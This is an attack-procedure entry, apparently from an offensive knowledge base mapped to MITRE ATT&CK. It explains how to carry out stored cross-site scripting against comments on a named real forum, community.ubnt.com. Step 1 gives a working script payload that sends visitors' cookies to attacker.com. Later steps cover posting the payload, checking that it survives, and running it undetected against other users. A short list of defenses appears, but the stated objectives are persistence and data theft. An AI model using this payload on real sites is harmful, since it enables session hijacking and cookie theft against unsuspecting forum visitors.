---
tags:
  - xss
  - injection
  - javascript
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:37.235Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 918f580d-9819-4ad8-bd82-de35320d8681
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject XSS Payload into Forum Comment

## Summary

This procedure details crafting and posting a malicious JavaScript payload into a forum comment on community.ubnt.com, exploiting stored XSS to ensure execution when viewed by other users, targeting session data collection.

## Description

Stored XSS allows persistent injection where the payload is saved server-side and rendered client-side for all viewers. Here, the forum's inadequate validation permits HTML/JS in comments. The payload exfiltrates cookies to an attacker server. Requires forum access and an external listener.

## Requirements

1. Access to post comments on community.ubnt.com
2. Attacker server (e.g., ngrok or VPS) to receive exfiltrated data
3. Knowledge of JavaScript for payload construction

## Defense

Defensive measures and detection strategies:

- Use output encoding (e.g., escape < > in HTML contexts)
- Deploy web application firewall (WAF) rules to block script tags
- Log and alert on suspicious comment content with scripts

## Objectives

1. Persist malicious code in the forum
2. Ensure payload executes on victim browsers
3. Enable data exfiltration without detection

## Instructions

### Step 1: Craft Payload

**Context**: Design a payload that captures and sends cookies upon execution.

Payload example: `<script>var img = new Image(); img.src = 'http://attacker.com/steal?data=' + encodeURIComponent(document.cookie);</script>`

> This uses a beacon image to silently send data via GET request.

### Step 2: Post to Comment Section

**Context**: Inject the payload into a comment under any forum post.

Enter the payload in the comment textarea and submit.

> Verify in page source that the script tag is intact post-submission.

### Step 3: Confirm Storage

**Context**: Check if the payload is stored and visible to others.

View the thread in a different browser session.

> Success if the script appears in HTML without alteration.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xss]]
- [[injection]]
- [[web]]
